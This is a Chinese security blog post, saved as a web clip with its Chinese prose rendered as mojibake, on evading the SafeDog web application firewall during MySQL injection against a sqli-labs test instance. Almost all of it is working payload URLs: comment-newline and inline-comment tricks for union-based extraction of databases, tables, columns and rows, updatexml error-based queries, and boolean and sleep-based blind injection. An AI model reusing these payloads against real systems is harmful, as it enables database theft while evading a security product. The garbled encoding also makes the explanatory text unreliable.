> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [y4er.com](https://y4er.com/post/bypass-mysql-safedog/)

æ—¥ç‹—

åˆ¤æ–­æ³¨å…¥
----

å®‰å…¨ç‹—ä¸è®©åŸºæœ¬è¿ç®—ç¬¦åè·Ÿæ•°å­—å­—ç¬¦ä¸²

ç‰¹æ®Šè¿ç®—ç¬¦ç»•

```
http://172.16.1.157/sql/Less-1/?id=1'and -1=-1 -- + æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1'and -1=-2 -- + ä¸æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1'and ~1=~1 -- +	æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1'and ~1=~2 -- +	ä¸æ­£å¸¸ 
```

16è¿›åˆ¶ç»•

```
http://172.16.1.157/sql/Less-1/?id=1' and 0x0 <> 0x1-- +	æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and 0x0 <> 0x0-- +	ä¸æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and 0x0 <=> 0x0-- +	æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and 0x0 <=> 0x1-- +	ä¸æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and 0x0 xor 0x1-- +	æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and 0x0 xor 0x0-- +	ä¸æ­£å¸¸ 
```

BINARYç»•

```
http://172.16.1.157/sql/Less-1/?id=1' and BINARY 1-- +	æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and BINARY 0-- +	ä¸æ­£å¸¸ 
```

conv()å‡½æ•°ç»•

```
http://172.16.1.157/sql/Less-1/?id=1' and CONV(1,11,2)-- +	æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and CONV(0,11,2)-- +	ä¸æ­£å¸¸ 
```

concat()å‡½æ•°ç»•

```
http://172.16.1.157/sql/Less-1/?id=1' and CONCAT(1)-- +		æ­£å¸¸
http://172.16.1.157/sql/Less-1/?id=1' and CONCAT(0)-- +		ä¸æ­£å¸¸ 
```

åˆ¤æ–­å­—æ®µæ•°
-----

ç»•order by

å†…è”

```
http://172.16.1.157/sql/Less-1/?id=1'/*!14440order by*/ 3 -- + 
```

æ³¨é‡Šæ¢è¡Œ

```
http://172.16.1.157/sql/Less-1/?id=1'order%23%0aby 3 -- + 
```

è”åˆæŸ¥è¯¢
----

å…³é”®åœ¨äºæ‰“ä¹±`union select`

å†…è”

```
http://172.16.1.157/sql/Less-1/?id=-1' /*!14440union*//*!14440select */1,2,3 -- + 
```

æ³¨é‡Šåè·Ÿåƒåœ¾å­—ç¬¦æ¢è¡Œ

```
http://172.16.1.157/sql/Less-1/?id=-1'union%23hhh%0aselect 1,2,3--+ 
```

union distinct | distinctrow | all

```
http://172.16.1.157/sql/Less-1/?id=-1' union distinct %23%0aselect 1,2,3 -- +
http://172.16.1.157/sql/Less-1/?id=-1' union distinctrow %23%0aselect 1,2,3 -- +
http://172.16.1.157/sql/Less-1/?id=-1' union all%23%0aselect 1,2,3 -- + 
```

æ¥ä¸‹æ¥æ˜¯æŸ¥æ•°æ®ï¼Œæˆ‘åœ¨è¿™ä½¿ç”¨`æ³¨é‡Šåƒåœ¾å­—ç¬¦æ¢è¡Œ`ä¹Ÿå°±æ˜¯`%23a%0a`çš„æ–¹æ³•æ¥ç»•ï¼Œä½ å¯ä»¥ç”¨ä¸Šé¢è¯´çš„`/*!14440*/`å†…è”

æŸ¥å½“å‰æ•°æ®åº“å

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23chabug%0a select 1,database%23%0a(%0a),3 -- + 
```

æŸ¥å…¶ä»–åº“å **å®‰å…¨ç‹—4.0é»˜è®¤æ²¡å¼€information_schemaé˜²æŠ¤çš„æ—¶å€™å¯ä»¥è¿‡**ï¼Œå¼€äº†information_schemaé˜²æŠ¤ä¹‹åç»•ä¸è¿‡å»ï¼Œå“­å”§å”§ğŸ˜­

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23asdasdasd%0a select 1,(select schema_name from %23%0ainformation_schema.schemata  limit 1,1),3 -- + 
```

æŸ¥è¡¨å

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23asdasdasd%0a select 1,(select table_name from %23%0ainformation_schema.tables where table_schema=database(%23%0a) limit 1,1),3 -- + 
```

æŸ¥åˆ—åï¼Œé¦–å…ˆæ˜¯æ²¡å¼€information_schemaé˜²æŠ¤æ—¶

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23a%0a select 1,(select column_name from %23%0a information_schema.columns where table_name=0x7573657273 and%23a%0a table_schema=database(%23%0a) limit 1,1),3 -- + 
```

å¼€information_schemaé˜²æŠ¤æœ‰ä¸¤ç§å§¿åŠ¿ï¼Œä¸è¿‡éœ€è¦çŸ¥é“è¡¨å

ä¸€ã€å­æŸ¥è¯¢

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23a%0a SELECT 1,2,x.2 from %23a%0a(SELECT * from %23a%0a (SELECT 1)a, (SELECT 2)b union  %23a%0aSELECT *from  %23a%0aemails)x limit 2,1 -- + 
```

äºŒã€ç”¨joinå’Œusingçˆ†åˆ—åï¼Œå‰ææ˜¯é¡µé¢å¯ä»¥æŠ¥é”™ï¼Œéœ€è¦å·²çŸ¥è¡¨å

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23a%0aSELECT 1,2,(select * from %23a%0a(select * from %23a%0aemails a join emails b) c) -- + 
```

![20191011213824](https://y4er.com/img/uploads/20191011213824.png)

ç„¶åé€šè¿‡usingæ¥ç»§ç»­çˆ†

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23a%0aSELECT 1,2,(select * from %23a%0a(select * from %23a%0aemails a join emails b using(id)) c) -- + 
```

![20191011213910](https://y4er.com/img/uploads/20191011213910.png)

æŸ¥æ•°æ®

```
http://172.16.1.157/sql/Less-1/?id=-1' union %23a%0aSELECT 1,2,(select email_id from%23a%0a emails limit 1,1) -- + 
```

å…¶å®é…åˆMySQL5.7çš„ç‰¹æ€§å¯ä»¥ä½¿ç”¨sysè¿™ä¸ªåº“æ¥ç»•è¿‡ï¼Œå…·ä½“çœ‹chabugå‘çš„æ–‡ç« å§ [æ³¨å…¥bypassä¹‹æ¶ç‹—å¼€é”ç ´ç›¾](https://www.chabug.org/web/1019.html)

> åœ¨ä¸‹æ–‡ä¸­ä¸å†æåŠå¼€å¯information_schemaé˜²æŠ¤çš„ç»•è¿‡å§¿åŠ¿ï¼Œè‡ªè¡Œä¸¾ä¸€åä¸‰ã€‚

æŠ¥é”™æ³¨å…¥
----

æŠ¥é”™æ³¨å…¥åªæåŠupdatexmlæŠ¥é”™

å…³é”®åœ¨äºupdatexml()ç»“æ„æ‰“ä¹±

```
and updatexml(1,1,1 	ä¸æ‹¦æˆª
and updatexml(1,1,1) 	æ‹¦æˆª 
```

ä¸è®©updatexmlåŒ¹é…åˆ°ä¸¤ä¸ªæ‹¬å·å°±è¡Œäº†

ç”¨æˆ·å åº“å

```
http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,concat(0x7e,user(/*!)*/,0x7e/*!)*/,1/*!)*/ -- +
http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,concat(0x7e,database(/*!)*/,0x7e/*!)*/,1/*!)*/ -- + 
```

åº“å

```
http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,`concat`(0x7e,(select schema_name from %23a%0a information_schema.schemata  limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- + 
```

è¡¨å

```
http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,`concat`(0x7e,(select table_name from %23a%0a information_schema.tables where table_schema=database(/*!)*/ limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- + 
```

åˆ—å

```
http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,`concat`(0x7e,(select column_name from %23a%0a information_schema.columns where table_schema=database(/*!)*/ and %23a%0atable_name=0x7573657273 limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- + 
```

æŸ¥æ•°æ®

```
http://172.16.1.157/sql/Less-1/?id=-1' and updatexml(1,concat(0x7e,(select email_id from %23a%0a emails limit 1,1/*!)*/,0x7e/*!)*/,1/*!)*/ -- + 
```

ç›²æ³¨
--

åˆ†å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨æ¥è¯´å§

### å¸ƒå°”ç›²æ³¨

ä¸è®©ä»–åŒ¹é…å®Œæ•´æ‹¬å·å¯¹

ä½¿ç”¨left()æˆ–è€…right()

```
http://172.16.1.157/sql/Less-1/?id=1' and hex(LEFT(user(/*!)*/,1))=%23a%0a72 -- +
http://172.16.1.157/sql/Less-1/?id=1' and hex(right(user(/*!)*/,1))=%23a%0a72 -- + 
```

ä½¿ç”¨substring() substr()

```
http://172.16.1.157/sql/Less-1/?id=1' and hex(SUBSTRING(user(/*!)*/,1,1))=72 -- +
http://172.16.1.157/sql/Less-1/?id=1' and hex(substr(user(/*!)*/,1,1))=72 -- + 
```

æŸ¥è¡¨å

```
http://172.16.1.157/sql/Less-1/?id=1' and hex(SUBSTR((select table_name from %23a%0a information_schema.tables where table_schema=%23a%0adatabase%23a%0a(/*!)*/ limit 0,1),1,1))=65-- + 
```

åˆ—åå­—æ®µååŒç†ï¼Œç•¥

### æ—¶é—´ç›²æ³¨

ä¸åŒ¹é…æˆå¯¹æ‹¬å·

sleep()ç»•è¿‡

```
http://172.16.1.157/sql/Less-1/?id=1' and sleep(3/*!)*/-- + 
```

æŸ¥ç”¨æˆ·

```
http://172.16.1.157/sql/Less-1/?id=1'  and if%23%0a(left(user(/*!)*/,1/*!)*/=char(114),sleep(3/*!)*/,1/*!)*/ -- +
http://172.16.1.157/sql/Less-1/?id=1'  and if%23%0a(left(user(/*!)*/,1/*!)*/=0x72,sleep(3/*!)*/,1/*!)*/ -- + 
```

æŸ¥æ•°æ® limitè¿‡ä¸äº†

```
http://172.16.1.157/sql/Less-1/?id=1'  and if%23%0a(left((select group_concat(table_name/*!)*/ from%23a%0ainformation_schema.tables where table_schema=database(/*!)*/ /*!)*/,1/*!)*/=0x65,sleep(5/*!)*/,1/*!)*/ -- + 
```

å…¶ä»–
--

length()é•¿åº¦

```
http://172.16.1.157/sql/Less-1/?id=1' and length(1)<=>1 -- +
http://172.16.1.157/sql/Less-1/?id=1'  and length(database(/*!))*/<=>8 -- + 
```

count()

```
http://172.16.1.157/sql/Less-1/?id=1'  and  (%23a%0aselect count(password/*!)*/ from %23a%0a users/*!)*/<=>13 -- + 
```

å‚è€ƒ
--

[https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)

[https://www.chabug.org/web/1019.html](https://www.chabug.org/web/1019.html)

**æ–‡ç¬”åƒåœ¾ï¼Œæªè¾è½»æµ®ï¼Œå†…å®¹æµ…æ˜¾ï¼Œæ“ä½œç”Ÿç–ã€‚ä¸è¶³ä¹‹å¤„æ¬¢è¿å¤§å¸ˆå‚…ä»¬æŒ‡ç‚¹å’Œçº æ­£ï¼Œæ„Ÿæ¿€ä¸å°½ã€‚**